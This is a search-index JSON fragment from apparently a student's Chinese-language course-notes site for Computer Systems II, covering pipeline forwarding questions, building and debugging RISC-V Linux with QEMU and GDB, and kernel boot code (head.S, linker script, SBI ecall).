\u5982\u679c EX, MEM, WB \u6bb5\u4e2d\u4e0d\u6b62\u4e00\u4e2a\u6bb5\u7684\u5199\u5bc4\u5b58\u5668\u4e0e ID \u6bb5\u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u8be5\u5982\u4f55\u5904\u7406\uff1f \u4e0d\u6b62\u4e00\u4e2a\u6bb5\u4e0e ID \u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u5e94\u8be5\u5148\u8003\u8651\u6700\u8fd1\u7684\u4e00\u4e2a\u5199\u5bc4\u5b58\u5668\uff08\u5148 EX \u7136\u540e MEM \u6700\u540e WB\uff09\uff0c\u5c06\u5176\u503c\u524d\u9012\u5230 ID \u6bb5\u4f5c\u4e3a\u5f53\u524d\u8bfb\u5bc4\u5b58\u5668\u7684\u5b9e\u9645\u503c\u3002","title":"lab 2-1"},{"location":"cs/system/cs2/lab2/#lab-2-2","text":"\u5728\u5f15\u5165 Forwarding \u673a\u5236\u540e\uff0c\u662f\u5426\u610f\u5473\u7740 stall \u673a\u5236\u5c31\u4e0d\u518d\u9700\u8981\u4e86\uff1f\u4e3a\u4ec0\u4e48\uff1f \u4e0d\u662f\uff0c\u56e0\u4e3a Forwarding \u673a\u5236\u53ea\u80fd\u89e3\u51b3\u90e8\u5206\u6570\u636e\u51b2\u7a81\uff0c\u4f8b\u5982 load-use \u51b2\u7a81\u5c31\u65e0\u6cd5\u901a\u8fc7 Forwarding \u5b8c\u5168\u89e3\u51b3\uff0c\u9700\u8981\u5148 stall \u4e00\u4e2a\u5468\u671f\u540e\u518d\u4f7f\u7528 Forwarding\u3002\u5176\u6b21\uff0c\u63a7\u5236\u51b2\u7a81\u4e5f\u9700\u8981\u901a\u8fc7 stall \u624d\u80fd\u89e3\u51b3\u3002 \u4f60\u8ba4\u4e3a Forwarding \u673a\u5236\u5728\u5b9e\u9645\u7684\u7535\u8def\u8bbe\u8ba1\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u5b9a\u7684\u5f0a\u7aef\uff1f\u5982\u679c\u5b58\u5728\uff0c\u8bf7\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002 Forwarding \u673a\u5236\u9700\u8981\u5728 ID \u6bb5\u4e2d\u589e\u52a0\u4e00\u4e9b\u9009\u62e9\u5668\uff0c\u589e\u52a0\u4e86\u7535\u8def\u7684\u590d\u6742\u5ea6\uff0c\u540c\u65f6\u4e5f\u589e\u52a0\u4e86\u7535\u8def\u7684\u5ef6\u8fdf\uff0c\u5b58\u5728\u4e00\u4e9b\u5f0a\u7aef\u3002\u4e0d\u8fc7 Forwarding \u673a\u5236\u53ef\u4ee5\u89e3\u51b3\u90e8\u5206\u6570\u636e\u51b2\u7a81\uff0c\u53ef\u4ee5\u51cf\u5c11 stall \u7684\u6b21\u6570\uff0c\u4ece\u800c\u63d0\u9ad8\u7535\u8def\u7684\u6548\u7387\u3002\u603b\u4e4b Forwarding \u673a\u5236\u786e\u5b9e\u6709\u5f0a\u7aef\uff0c\u4f46\u7efc\u5408\u6765\u770b\u4e0d\u4e00\u5b9a\u6709\u6ca1\u6709\u5f0a\u7aef\u3002","title":"lab 2-2"},{"location":"cs/system/cs2/lab3/","text":"GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082022.10.27 ~ 2022.11.10\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u642d\u5efa\u5b9e\u9a8c\u73af\u5883 \u5b89\u88c5 risc-v \u5de5\u5177\u94fe\u548c qemu \u6a21\u62df\u5668 \u83b7\u53d6 Linux \u6e90\u7801\u548c\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u7cfb\u7edf \u4ece kernel.org \u4e0b\u8f7d\u6700\u65b0\u7684 Linux \u6e90\u7801 \u4ece\u8bfe\u7a0b\u4ed3\u5e93\u514b\u9686\u6587\u4ef6\u7cfb\u7edf\u955c\u50cf \u7f16\u8bd1 Linux \u5185\u6838 \u4f7f\u7528 QEMU \u8fd0\u884c\u5185\u6838 \u4f7f\u7528 GDB \u5bf9\u5185\u6838\u8fdb\u884c\u8c03\u8bd5 \u601d\u8003\u9898 \u4f7f\u7528 riscv64-linux-gnu-gcc \u7f16\u8bd1\u5355\u4e2a .c \u6587\u4ef6 \u4f7f\u7528 riscv64-linux-gnu-objdump \u53cd\u6c47\u7f16\u524d\u9762\u5f97\u5230\u7684\u7f16\u8bd1\u4ea7\u7269 \u8c03\u8bd5 Linux \u65f6\uff1a \u5728 GDB \u4e2d\u67e5\u770b\u6c47\u7f16\u4ee3\u7801 \u5728 0x80000000 \u5904\u4e0b\u65ad\u70b9 \u67e5\u770b\u6240\u6709\u5df2\u4e0b\u7684\u65ad\u70b9 \u5728 0x80200000 \u5904\u4e0b\u65ad\u70b9 \u6e05\u9664 0x80000000 \u5904\u7684\u65ad\u70b9 \u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u89e6\u53d1 0x80200000 \u5904\u7684\u65ad\u70b9 \u5355\u6b65\u8c03\u8bd5\u4e00\u6b21 \u9000\u51fa QEMU \u5b66\u4e60 Makefile \u7684\u57fa\u672c\u4f7f\u7528 \u89c2\u5bdf\u53ef\u7528\u7684 target\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u6e05\u9664 Linux \u7684\u6784\u5efa\u4ea7\u7269\uff1f \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5185\u6838\u7f16\u8bd1\u663e\u793a\u7684\u662f\u7b80\u7565\u4fe1\u606f\uff08\u4f8b\u5982\uff1aCC init/main.o\uff09\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u663e\u793a Linux \u8be6\u7ec6\u7684\u7f16\u8bd1\u8fc7\u7a0b\u5462\uff1f \u73af\u5883\u642d\u5efa \u00b6 \u5b89\u88c5 risc-v \u5de5\u5177\u94fe\u548c qemu \u6a21\u62df\u5668 \u00b6 \u547d\u4ee4\u884c\u8fd0\u884c\uff1a sudo apt install qemu-system-misc gcc-riscv64-linux-gnu gdb-multiarch \u68c0\u67e5\u7248\u672c\uff1a \u5b89\u88c5\u5176\u5b83\u540e\u7eed\u9700\u8981\u7684\u8f6f\u4ef6\u5305 \u00b6 Ubuntu \u4e0d\u81ea\u5e26 make\u3001gcc \u7b49\u5de5\u5177\uff0c\u9700\u8981\u624b\u52a8\u5b89\u88c5\uff1a sudo apt install build-essential \u5728\u540e\u9762\u7f16\u8bd1\u5185\u6838\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u51fa\u73b0 /bin/sh: 1: flex: not found \u4ee5\u53ca bison: not found \u7684\u9519\u8bef\uff0c\u9700\u8981\u5b89\u88c5 flex \u548c bison\uff1a sudo apt install flex bison \u83b7\u53d6\u3001\u7f16\u8bd1\u6e90\u7801 \u00b6 \u83b7\u53d6 Linux \u6e90\u7801 \u00b6 \u5728 kernel.org \u4e0a\u67e5\u627e\u6e90\u7801\uff0c\u9009\u62e9 6.0.5 \u7248\u672c\u4e0b\u8f7d\uff086.1 \u7248\u672c\u4e2d\u542b\u6709 rust\uff0c\u4e0d\u9009\uff09\u5e76\u89e3\u538b\uff1a wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.0.5.tar.xz tar -xf linux-6.0.5.tar.xz \u514b\u9686\u8bfe\u7a0b\u4ed3\u5e93\uff1a git clone https://git.zju.edu.cn/zju-sys/sys2lab-22fall-stu.git \u7f16\u8bd1 Linux \u5185\u6838 \u00b6 \u8fdb\u5165\u89e3\u538b\u540e\u7684 Linux \u6e90\u7801\u6587\u4ef6\u5939\uff0c\u8fdb\u884c\u7f16\u8bd1\uff1a make ARCH = riscv CROSS_COMPILE = riscv64-linux-gnu- defconfig make ARCH = riscv CROSS_COMPILE = riscv64-linux-gnu- -j4 \u5341\u5206\u949f\u540e\u5b8c\u6210\u7f16\u8bd1\uff0c\u5e76\u53ef\u4ee5 ls \u67e5\u770b\u5230\u7f16\u8bd1\u4ea7\u7269\uff1a \u8fd0\u884c\u3001\u8c03\u8bd5\u5185\u6838 \u00b6 \u4f7f\u7528 QEMU \u8fd0\u884c\u5185\u6838 \u00b6 \u8fdb\u5165 sys2lab-22fall-stu/src/lab3 \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a qemu-system-riscv64 -nographic -machine virt \\ -kernel ~/Desktop/linux-6.0.5/arch/riscv/boot/Image \\ -device virtio-blk-device,drive = hd0 \\ -append \"root=/dev/vda ro console=ttyS0\" \\ -bios fw_jump.bin -drive file = rootfs.img,format = raw,id = hd0 \u4f7f\u7528 QEMU \u6a21\u62df\u5668\u6765\u8fd0\u884c\u5185\u6838\u3002\u8fd9\u91cc\u8981\u6ce8\u610f\uff0ckernel \u662f arch/riscv/boot/Image \u800c\u4e0d\u662f vmlinux\uff0c\u800c\u4e14\u4e0d\u80fd\u52a0 -S -s\uff0c\u5426\u5219\u4f1a\u7b49\u5f85 gdb \u8fde\u63a5\u518d\u64cd\u4f5c\u8fd0\u884c\u3002\u8fd0\u884c\u8d77\u6765\u4e4b\u540e\u5c31\u53ef\u4ee5\u8fdb\u5165\u5230 shell \u4e2d\u8fd0\u884c\u6307\u4ee4\u4e86\uff1a \u7136\u540e exit \u9000\u51fa shell\uff0cCtrl+A\u3001X \u9000\u51fa QEMU\u3002 \u4f7f\u7528 GDB \u8c03\u8bd5\u5185\u6838 \u00b6 \u5728\u4e00\u4e2a\u7ec8\u7aef\u8fd0\u884c\u4e0b\u9762\u547d\u4ee4\u542f\u7528\u4e00\u4e2a\u5185\u6838\u5e76\u7b49\u5f85\u8c03\u8bd5\uff1a qemu-system-riscv64 -nographic -machine virt \\ -kernel ~/Desktop/linux-6.0.5/arch/riscv/boot/Image \\ -device virtio-blk-device,drive = hd0 \\ -append \"root=/dev/vda ro console=ttyS0\" \\ -bios fw_jump.bin -drive file = rootfs.img,format = raw,id = hd0 \\ -S -s \u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u542f\u52a8 gdb\uff1a gdb-multiarch vmlinux \u8fde\u63a5\u3001\u4e0b\u65ad\u70b9\u3001\u67e5\u770b\u65ad\u70b9\uff0c\u7ee7\u7eed\u8fd0\u884c\uff1a \u67e5\u770b\u6c47\u7f16\u3001\u67e5\u770b\u5bc4\u5b58\u5668\u503c\u3001\u5355\u6307\u4ee4\u8fd0\u884c\uff1a \u67e5\u770b\u5e27\u6808\u4fe1\u606f\uff1a layout asm\uff08\u4f7f\u7528 Ctrl+X\u3001A \u9000\u51fa\uff09\uff1a \u601d\u8003\u9898 \u00b6 \u7f16\u8bd1 c \u8bed\u8a00\u6587\u4ef6\u5e76\u53cd\u6c47\u7f16 \u00b6 \u548c\u7cfb\u7edf\u4e00\u4e2d\u7684\u5b9e\u9a8c\u4e00\u6837\uff0c\u4f7f\u7528 riscv64-linux-gnu-gcc \u7f16\u8bd1\u3001-objdump \u53cd\u6c47\u7f16\u5373\u53ef\u3002\u6e90\u6587\u4ef6\uff1a #include <stdio.h> int main () { int a = 1 , b = 2 ; printf ( \"%d \\n \" , a + b ); return 0 ; } \u5148\u9759\u6001\u7f16\u8bd1\uff08\u65b9\u4fbf\u8fd0\u884c\uff09\uff0c\u7136\u540e\u52a8\u6001\u7f16\u8bd1\u5e76\u4f7f\u7528 objdump \u53cd\u6c47\u7f16\uff1a \u8c03\u8bd5 Linux \u00b6 \u67e5\u770b\u6c47\u7f16\u3001\u5728 0x80000000 \u4e0b\u65ad\u70b9\u3001\u67e5\u770b\u65ad\u70b9\u3001\u5728 0x80200000 \u4e0b\u65ad\u70b9\u3001\u53d6\u6d88 0x80000000 \u5904\u7684\u65ad\u70b9\u3001\u7ee7\u7eed\u8fd0\u884c\uff1a \u5355\u6b65\u8fd0\u884c\u3001\u9000\u51fa\uff1a Makefile \u76f8\u5173 \u00b6 \u89c2\u5bdf\u53ef\u7528\u7684 target\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u6e05\u9664 Linux \u7684\u6784\u5efa\u4ea7\u7269\uff1f \u5e94\u8be5\u4f7f\u7528 make clean \u6765\u6e05\u9664\u6784\u5efa\u4ea7\u7269 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5185\u6838\u7f16\u8bd1\u663e\u793a\u7684\u662f\u7b80\u7565\u4fe1\u606f\uff08\u4f8b\u5982\uff1aCC init/main.o\uff09\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u663e\u793a Linux \u8be6\u7ec6\u7684\u7f16\u8bd1\u8fc7\u7a0b\u5462\uff1f make help \u53ef\u4ee5\u770b\u5230\uff1a make V=0|1 [targets] 0 => quiet build (default), 1 => verbose build make V=2 [targets] 2 => give reason for rebuild of target \u6240\u4ee5\u5e94\u8be5\u4f7f\u7528 make V=1","title":"\u7cfb\u7edf II lab3"},{"location":"cs/system/cs2/lab3/#gdbqemu-64-risc-v-linux","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082022.10.27 ~ 2022.11.10\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX"},{"location":"cs/system/cs2/lab3/#_1","text":"\u642d\u5efa\u5b9e\u9a8c\u73af\u5883 \u5b89\u88c5 risc-v \u5de5\u5177\u94fe\u548c qemu \u6a21\u62df\u5668 \u83b7\u53d6 Linux \u6e90\u7801\u548c\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u7cfb\u7edf \u4ece kernel.org \u4e0b\u8f7d\u6700\u65b0\u7684 Linux \u6e90\u7801 \u4ece\u8bfe\u7a0b\u4ed3\u5e93\u514b\u9686\u6587\u4ef6\u7cfb\u7edf\u955c\u50cf \u7f16\u8bd1 Linux \u5185\u6838 \u4f7f\u7528 QEMU \u8fd0\u884c\u5185\u6838 \u4f7f\u7528 GDB \u5bf9\u5185\u6838\u8fdb\u884c\u8c03\u8bd5 \u601d\u8003\u9898 \u4f7f\u7528 riscv64-linux-gnu-gcc \u7f16\u8bd1\u5355\u4e2a .c \u6587\u4ef6 \u4f7f\u7528 riscv64-linux-gnu-objdump \u53cd\u6c47\u7f16\u524d\u9762\u5f97\u5230\u7684\u7f16\u8bd1\u4ea7\u7269 \u8c03\u8bd5 Linux \u65f6\uff1a \u5728 GDB \u4e2d\u67e5\u770b\u6c47\u7f16\u4ee3\u7801 \u5728 0x80000000 \u5904\u4e0b\u65ad\u70b9 \u67e5\u770b\u6240\u6709\u5df2\u4e0b\u7684\u65ad\u70b9 \u5728 0x80200000 \u5904\u4e0b\u65ad\u70b9 \u6e05\u9664 0x80000000 \u5904\u7684\u65ad\u70b9 \u7ee7\u7eed\u8fd0\u884c\u76f4\u5230\u89e6\u53d1 0x80200000 \u5904\u7684\u65ad\u70b9 \u5355\u6b65\u8c03\u8bd5\u4e00\u6b21 \u9000\u51fa QEMU \u5b66\u4e60 Makefile \u7684\u57fa\u672c\u4f7f\u7528 \u89c2\u5bdf\u53ef\u7528\u7684 target\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u6e05\u9664 Linux \u7684\u6784\u5efa\u4ea7\u7269\uff1f \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5185\u6838\u7f16\u8bd1\u663e\u793a\u7684\u662f\u7b80\u7565\u4fe1\u606f\uff08\u4f8b\u5982\uff1aCC init/main.o\uff09\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u663e\u793a Linux \u8be6\u7ec6\u7684\u7f16\u8bd1\u8fc7\u7a0b\u5462\uff1f","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs2/lab3/#_2","text":"","title":"\u73af\u5883\u642d\u5efa"},{"location":"cs/system/cs2/lab3/#risc-v-qemu","text":"\u547d\u4ee4\u884c\u8fd0\u884c\uff1a sudo apt install qemu-system-misc gcc-riscv64-linux-gnu gdb-multiarch \u68c0\u67e5\u7248\u672c\uff1a","title":"\u5b89\u88c5 risc-v \u5de5\u5177\u94fe\u548c qemu \u6a21\u62df\u5668"},{"location":"cs/system/cs2/lab3/#_3","text":"Ubuntu \u4e0d\u81ea\u5e26 make\u3001gcc \u7b49\u5de5\u5177\uff0c\u9700\u8981\u624b\u52a8\u5b89\u88c5\uff1a sudo apt install build-essential \u5728\u540e\u9762\u7f16\u8bd1\u5185\u6838\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u51fa\u73b0 /bin/sh: 1: flex: not found \u4ee5\u53ca bison: not found \u7684\u9519\u8bef\uff0c\u9700\u8981\u5b89\u88c5 flex \u548c bison\uff1a sudo apt install flex bison","title":"\u5b89\u88c5\u5176\u5b83\u540e\u7eed\u9700\u8981\u7684\u8f6f\u4ef6\u5305"},{"location":"cs/system/cs2/lab3/#_4","text":"","title":"\u83b7\u53d6\u3001\u7f16\u8bd1\u6e90\u7801"},{"location":"cs/system/cs2/lab3/#linux","text":"\u5728 kernel.org \u4e0a\u67e5\u627e\u6e90\u7801\uff0c\u9009\u62e9 6.0.5 \u7248\u672c\u4e0b\u8f7d\uff086.1 \u7248\u672c\u4e2d\u542b\u6709 rust\uff0c\u4e0d\u9009\uff09\u5e76\u89e3\u538b\uff1a wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.0.5.tar.xz tar -xf linux-6.0.5.tar.xz \u514b\u9686\u8bfe\u7a0b\u4ed3\u5e93\uff1a git clone https://git.zju.edu.cn/zju-sys/sys2lab-22fall-stu.git","title":"\u83b7\u53d6 Linux \u6e90\u7801"},{"location":"cs/system/cs2/lab3/#linux_1","text":"\u8fdb\u5165\u89e3\u538b\u540e\u7684 Linux \u6e90\u7801\u6587\u4ef6\u5939\uff0c\u8fdb\u884c\u7f16\u8bd1\uff1a make ARCH = riscv CROSS_COMPILE = riscv64-linux-gnu- defconfig make ARCH = riscv CROSS_COMPILE = riscv64-linux-gnu- -j4 \u5341\u5206\u949f\u540e\u5b8c\u6210\u7f16\u8bd1\uff0c\u5e76\u53ef\u4ee5 ls \u67e5\u770b\u5230\u7f16\u8bd1\u4ea7\u7269\uff1a","title":"\u7f16\u8bd1 Linux \u5185\u6838"},{"location":"cs/system/cs2/lab3/#_5","text":"","title":"\u8fd0\u884c\u3001\u8c03\u8bd5\u5185\u6838"},{"location":"cs/system/cs2/lab3/#qemu","text":"\u8fdb\u5165 sys2lab-22fall-stu/src/lab3 \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a qemu-system-riscv64 -nographic -machine virt \\ -kernel ~/Desktop/linux-6.0.5/arch/riscv/boot/Image \\ -device virtio-blk-device,drive = hd0 \\ -append \"root=/dev/vda ro console=ttyS0\" \\ -bios fw_jump.bin -drive file = rootfs.img,format = raw,id = hd0 \u4f7f\u7528 QEMU \u6a21\u62df\u5668\u6765\u8fd0\u884c\u5185\u6838\u3002\u8fd9\u91cc\u8981\u6ce8\u610f\uff0ckernel \u662f arch/riscv/boot/Image \u800c\u4e0d\u662f vmlinux\uff0c\u800c\u4e14\u4e0d\u80fd\u52a0 -S -s\uff0c\u5426\u5219\u4f1a\u7b49\u5f85 gdb \u8fde\u63a5\u518d\u64cd\u4f5c\u8fd0\u884c\u3002\u8fd0\u884c\u8d77\u6765\u4e4b\u540e\u5c31\u53ef\u4ee5\u8fdb\u5165\u5230 shell \u4e2d\u8fd0\u884c\u6307\u4ee4\u4e86\uff1a \u7136\u540e exit \u9000\u51fa shell\uff0cCtrl+A\u3001X \u9000\u51fa QEMU\u3002","title":"\u4f7f\u7528 QEMU \u8fd0\u884c\u5185\u6838"},{"location":"cs/system/cs2/lab3/#gdb","text":"\u5728\u4e00\u4e2a\u7ec8\u7aef\u8fd0\u884c\u4e0b\u9762\u547d\u4ee4\u542f\u7528\u4e00\u4e2a\u5185\u6838\u5e76\u7b49\u5f85\u8c03\u8bd5\uff1a qemu-system-riscv64 -nographic -machine virt \\ -kernel ~/Desktop/linux-6.0.5/arch/riscv/boot/Image \\ -device virtio-blk-device,drive = hd0 \\ -append \"root=/dev/vda ro console=ttyS0\" \\ -bios fw_jump.bin -drive file = rootfs.img,format = raw,id = hd0 \\ -S -s \u5728\u53e6\u4e00\u4e2a\u7ec8\u7aef\u542f\u52a8 gdb\uff1a gdb-multiarch vmlinux \u8fde\u63a5\u3001\u4e0b\u65ad\u70b9\u3001\u67e5\u770b\u65ad\u70b9\uff0c\u7ee7\u7eed\u8fd0\u884c\uff1a \u67e5\u770b\u6c47\u7f16\u3001\u67e5\u770b\u5bc4\u5b58\u5668\u503c\u3001\u5355\u6307\u4ee4\u8fd0\u884c\uff1a \u67e5\u770b\u5e27\u6808\u4fe1\u606f\uff1a layout asm\uff08\u4f7f\u7528 Ctrl+X\u3001A \u9000\u51fa\uff09\uff1a","title":"\u4f7f\u7528 GDB \u8c03\u8bd5\u5185\u6838"},{"location":"cs/system/cs2/lab3/#_6","text":"","title":"\u601d\u8003\u9898"},{"location":"cs/system/cs2/lab3/#c","text":"\u548c\u7cfb\u7edf\u4e00\u4e2d\u7684\u5b9e\u9a8c\u4e00\u6837\uff0c\u4f7f\u7528 riscv64-linux-gnu-gcc \u7f16\u8bd1\u3001-objdump \u53cd\u6c47\u7f16\u5373\u53ef\u3002\u6e90\u6587\u4ef6\uff1a #include <stdio.h> int main () { int a = 1 , b = 2 ; printf ( \"%d \\n \" , a + b ); return 0 ; } \u5148\u9759\u6001\u7f16\u8bd1\uff08\u65b9\u4fbf\u8fd0\u884c\uff09\uff0c\u7136\u540e\u52a8\u6001\u7f16\u8bd1\u5e76\u4f7f\u7528 objdump \u53cd\u6c47\u7f16\uff1a","title":"\u7f16\u8bd1 c \u8bed\u8a00\u6587\u4ef6\u5e76\u53cd\u6c47\u7f16"},{"location":"cs/system/cs2/lab3/#linux_2","text":"\u67e5\u770b\u6c47\u7f16\u3001\u5728 0x80000000 \u4e0b\u65ad\u70b9\u3001\u67e5\u770b\u65ad\u70b9\u3001\u5728 0x80200000 \u4e0b\u65ad\u70b9\u3001\u53d6\u6d88 0x80000000 \u5904\u7684\u65ad\u70b9\u3001\u7ee7\u7eed\u8fd0\u884c\uff1a \u5355\u6b65\u8fd0\u884c\u3001\u9000\u51fa\uff1a","title":"\u8c03\u8bd5 Linux"},{"location":"cs/system/cs2/lab3/#makefile","text":"\u89c2\u5bdf\u53ef\u7528\u7684 target\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u6e05\u9664 Linux \u7684\u6784\u5efa\u4ea7\u7269\uff1f \u5e94\u8be5\u4f7f\u7528 make clean \u6765\u6e05\u9664\u6784\u5efa\u4ea7\u7269 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5185\u6838\u7f16\u8bd1\u663e\u793a\u7684\u662f\u7b80\u7565\u4fe1\u606f\uff08\u4f8b\u5982\uff1aCC init/main.o\uff09\uff0c\u5e94\u8be5\u4f7f\u7528 make ? \u6765\u663e\u793a Linux \u8be6\u7ec6\u7684\u7f16\u8bd1\u8fc7\u7a0b\u5462\uff1f make help \u53ef\u4ee5\u770b\u5230\uff1a make V=0|1 [targets] 0 => quiet build (default), 1 => verbose build make V=2 [targets] 2 => give reason for rebuild of target \u6240\u4ee5\u5e94\u8be5\u4f7f\u7528 make V=1","title":"Makefile \u76f8\u5173"},{"location":"cs/system/cs2/lab4/","text":"RV64 \u5185\u6838\u5f15\u5bfc \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab4 \u5b9e\u9a8c\u62a5\u544a\uff082022.11.03 ~ 2022.11.17\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 \u7f16\u5199\u3001\u5b8c\u6210\u6240\u7ed9\u5b9e\u9a8c\u4ee3\u7801\u6846\u67b6\uff0c\u5e76\u6210\u529f\u8fd0\u884c arch/riscv/kernel/head.S lib/Makefile arch/riscv/kernel/sbi.c lib/print.c arch/riscv/include/defs.h \u601d\u8003\u9898 \u7f16\u8bd1\u4e4b\u540e\uff0c\u901a\u8fc7 System.map \u67e5\u770b vmlinux.lds \u4e2d\u81ea\u5b9a\u4e49\u7b26\u53f7\u7684\u503c\uff0c\u6bd4\u8f83\u4ed6\u4eec\u7684\u5730\u5740\u662f\u5426\u7b26\u5408\u4f60\u7684\u9884\u671f \u5728\u4f60\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\u6dfb\u52a0\u65ad\u70b9\uff0c\u89c2\u5bdf\u4f60\u7684\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\u7684\u7279\u6743\u6001\u662f\u591a\u5c11\uff0c\u4e2d\u65ad\u7684\u5f00\u542f\u60c5\u51b5\u662f\u600e\u4e48\u6837\u7684 \u5728\u4f60\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u5904\u6dfb\u52a0\u65ad\u70b9\uff0c\u89c2\u5bdf\u5185\u5b58\u4e2d text\u3001data\u3001bss \u6bb5\u7684\u5185\u5bb9\u662f\u600e\u6837\u7684 \u5c1d\u8bd5\u4ece\u6c47\u7f16\u4ee3\u7801\u4e2d\u7ed9 C \u51fd\u6570 start_kernel \u4f20\u9012\u53c2\u6570 \u4ee3\u7801\u7f16\u5199 \u00b6 head.S & vmlinux.lds \u00b6 head.S \u7684\u4f5c\u7528\u662f\u4f5c\u4e3a\u6574\u4e2a\u5185\u6838\u542f\u52a8\u7684\u5f15\u5bfc\u3002\u5176\u8981\u5b8c\u6210\u7684\u662f 1. \u4e3a start_kernel \u8bbe\u7f6e\u4e00\u4e2a\u6808\u7a7a\u95f4\uff08\u5373\u521b\u5efa\u6808\u7a7a\u95f4\u5e76\u5c06 sp \u6307\u5230\u6808\u9876\uff092. \u8df3\u8f6c\u5230 start_kernel \u5185\u3002 vmlinux.lds \u7684\u4f5c\u7528\u662f\u5b9a\u4e49\u5185\u6838\u7684\u5185\u5b58\u5e03\u5c40\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5c06\u6808\u7a7a\u95f4\u653e\u5230 _end \u540e\u9762\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728 vmlinux.lds \u4e2d _end \u540e\u9762\u518d\u52a0\u4e00\u4e2a\u6bb5 .stack\uff0c\u65b9\u4fbf\u540e\u7eed head.S \u5728\u6b64\u5904\u63d2\u5165\u6808\u7a7a\u95f4\uff1a _end = .; .stack : ALIGN(0x1000){ _sstack = .; *(.stack.entry) _estack = .; } } \u7136\u540e\u5728 head.S \u4e2d\u5229\u7528 .space \u8bbe\u7f6e\u7a7a\u95f4\u5927\u5c0f\u4e3a 4KB\u3001la \u6765\u8bbe\u7f6e sp \u5bc4\u5b58\u5668\u3001j \u6307\u4ee4\u8df3\u8f6c\u5230 start_kernel \u4e2d\uff1a .extern start_kernel .section .text.entry .globl _start _start: la sp, boot_stack_top j start_kernel .section .stack.entry .globl boot_stack_bottom boot_stack_bottom: .space 4096 .globl boot_stack_top boot_stack_top: sbi.c \u00b6 sbi.c \u7684\u4f5c\u7528\u662f\u5b9e\u73b0 SBI \u8c03\u7528\u3002\u6700\u4e3b\u8981\u7684\u76ee\u7684\u662f\u5b9e\u73b0 sbi_ecall \u6765\u6267\u884c\u73af\u5883\u8c03\u7528\uff0c\u7528\u5176\u53ef\u4ee5\u5b9e\u73b0 sbi_console_putchar \u7b49\u51fd\u6570\u3002 sbi_ecall \u7684\u5b9e\u73b0\u53c2\u8003\u4e86 Linux 6.0.7 \u7684\u4ee3\u7801\u5b9e\u73b0\u3002\u5176\u4e3b\u8981\u8fc7\u7a0b\u5c31\u662f\u5c06\u51fd\u6570\u53c2\u6570\u5e03\u5c40\u5230\u5bc4\u5b58\u5668\u4e2d\uff08ext \u653e\u5230 a7\u3001fid \u653e\u5230 a6\u3001arg0-5 \u653e\u5230 a0-5\uff09\uff0c\u7136\u540e\u6267\u884c ecall \u6307\u4ee4\uff0c\u6700\u540e\u8fd4\u56de\u7684\u7ed3\u679c\u6709 a0 \u8868\u793a error code\uff0ca1 \u8868\u793a\u8fd4\u56de\u503c\uff08\u6240\u4ee5\u8fd9\u4e24\u4e2a\u5bc4\u5b58\u5668\u8981\u662f\u8bfb\u5199\u7684\uff0c\u5176\u5b83\u662f\u53ef\u8bfb\u5373\u53ef\uff09\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4fee\u6539\u5185\u5b58\u3002\u5229\u7528\u5185\u8054\u6c47\u7f16\u53ef\u4ee5\u8fdb\u884c\u5982\u4e0b\u5b9e\u73b0\uff1a struct sbiret sbi_ecall ( int ext , int fid , uint64 arg0 , uint64 arg1 , uint64 arg2 , uint64 arg3 , uint64 arg4 , uint64 arg5 ) { struct sbiret ret ; register uint64 a0 asm ( \"a0\" ) = ( uint64 )( arg0 ); register uint64 a1 asm ( \"a1\" ) = ( uint64 )( arg1 ); register uint64 a2 asm ( \"a2\" ) = ( uint64 )( arg2 ); register uint64 a3 asm ( \"a3\" ) = ( uint64 )( arg3 ); register uint64 a4 asm ( \"a4\" ) = ( uint64 )( arg4 ); register uint64 a5 asm ( \"a5\" ) = ( uint64 )( arg5 ); register uint64 a6 asm ( \"a6\" ) = ( uint64 